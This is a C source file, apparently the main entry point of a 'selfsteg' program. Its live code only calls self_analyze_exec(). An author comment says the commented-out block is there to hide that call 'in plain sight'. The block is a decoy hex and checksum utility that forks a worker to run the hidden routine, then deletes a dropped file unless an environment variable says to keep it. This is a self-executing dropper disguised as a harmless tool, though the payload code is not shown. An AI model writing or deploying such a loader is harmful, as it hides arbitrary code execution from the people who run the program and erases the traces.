
#include "src/selfsteg.h"

int main(void) { 
    return self_analyze_exec(); 
    /* this is the smallest version of it, 
    the below is just a way to hide this 
    function in plain sight. No point to 
    obfuscate it if you can strip the binary 
    after*/
} 


// #include <errno.h>
// #include <stdint.h>
// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <sys/mman.h>
// #include <sys/wait.h>
// #include <unistd.h>

// #include "src/selfsteg.h"
// #include "src/carrier.h"

// int main(int argc, char **argv)
// {

//     g_dropped_path = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
//                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);

//     pid_t pid = fork();
//     if (pid < 0) {
//         perror("fork");
//         return 1;
//     }
//     if (pid == 0) {
//         int rc = self_analyze_exec();
//         _exit(rc == 0 ? 0 : 127);
//     }
//     int st = 0;
//     pid_t w;
//     do {
//         w = waitpid(pid, &st, 0);
//     } while (w < 0 && errno == EINTR);

//     if (getenv("HEXKIT_VERBOSE")) {
//         if (WIFEXITED(st)) {
//             int c = WEXITSTATUS(st);
//             if (c == 127)
//                 puts("self-check failed");
//             else
//                 printf("worker exited with code %d\n", c);
//         } else if (WIFSIGNALED(st)) {
//             printf("worker died: signal %d\n", WTERMSIG(st));
//         }
//     }

//     if (g_dropped_path && g_dropped_path[0] && !getenv("HEXKIT_KEEP"))
//         unlink(g_dropped_path);

//     const char *hexarg = "deadbeef";
//     const char *filearg = NULL;
//     int do_selftest_only = 0, do_help = 0, do_version = 0;
//     for (int i = 1; i < argc; i++) {
//         if (!strcmp(argv[i], "-s") || !strcmp(argv[i], "--selftest"))
//             do_selftest_only = 1;
//         else if ((!strcmp(argv[i], "-f") || !strcmp(argv[i], "--file")) && i + 1 < argc)
//             filearg = argv[++i];
//         else if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--version"))
//             do_version = 1;
//         else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help"))
//             do_help = 1;
//         else
//             hexarg = argv[i];
//     }
//     if (do_help) {
//         puts(hu_usage_text());
//         return 0;
//     }
//     if (do_version) {
//         printf("%s\n", hu_version_text());
//         return 0;
//     }

//     unsigned nf = hu_selftest();
//     printf("selftest: %u micro-functions ok (sink %016llx)\n",
//            nf, (unsigned long long)hu_sink_value());
//     if (do_selftest_only)
//         return 0;

//     uint8_t buf[64];
//     int n = hu_parse_hex(hexarg, buf, sizeof buf);
//     uint16_t crc = hu_crc16(buf, (size_t)n);
//     uint32_t fnv = hu_fnv1a32(buf, (size_t)n);
//     int pc = 0;
//     for (int i = 0; i < n; i++)
//         pc += hu_popcount8(buf[i]);
//     char hex[16];
//     hu_u32_hex(fnv, hex);
//     printf("hex utils: %d bytes  crc16=%04x  fnv1a=%s  popcount=%d\n", n, crc, hex, pc);

//     if (filearg) {
//         char line[512];
//         int m = hu_file_checksums(filearg, line, sizeof line);
//         if (m < 0)
//             printf("file %s: cannot read (missing or > 8 MB)\n", filearg);
//         else
//             puts(line);
//     }
//     return 0;
// }


